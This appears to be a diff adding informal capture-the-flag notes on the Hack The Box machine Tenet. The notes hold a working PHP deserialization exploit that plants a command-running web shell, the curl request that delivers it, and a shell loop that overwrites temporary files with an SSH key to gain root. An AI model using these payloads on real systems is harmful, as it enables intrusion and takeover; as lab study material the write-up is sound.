@@ -1,0 +1,45 @@
+there was a apache page with directory wordpress
+
+now on tenet.htb there was comment suggesting to move sator.php to ==backup so the file will be sator.php.bak==
+
+on getting it it said
+
+```
+$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+```
+
+so we gotta make arequest to arepo and ==desetilaize== it
+
+```
+<?php
+
+class DatabaseExport {
+
+    public $user_file = "0xdf.php";
+    public $data = '<?php system($_REQUEST["cmd"]); ?>';
+
+}
+
+$sploit = new DatabaseExport;
+echo serialize($sploit);
+?>
+```
+
+and on running it it gives us the payload
+
+now we urlencode it and send it to arepo
+
+`curl -G http://10.10.10.223/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"0xdf.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}'`
+
+we tried using -X GET but it didnot work so ==we used -G==
+
+it will give us shell
+
+now for root part
+
+a script was updating id-rsa on root via tmp-ranodmdsds file so we chnaged all tmp-* file in a loop with our id_rsa and got shell
+
+`while true; do for fn in /tmp/ssh*; do echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > $fn; done; done`
+
+`and also ran sudo py file in 2 tab in loop `
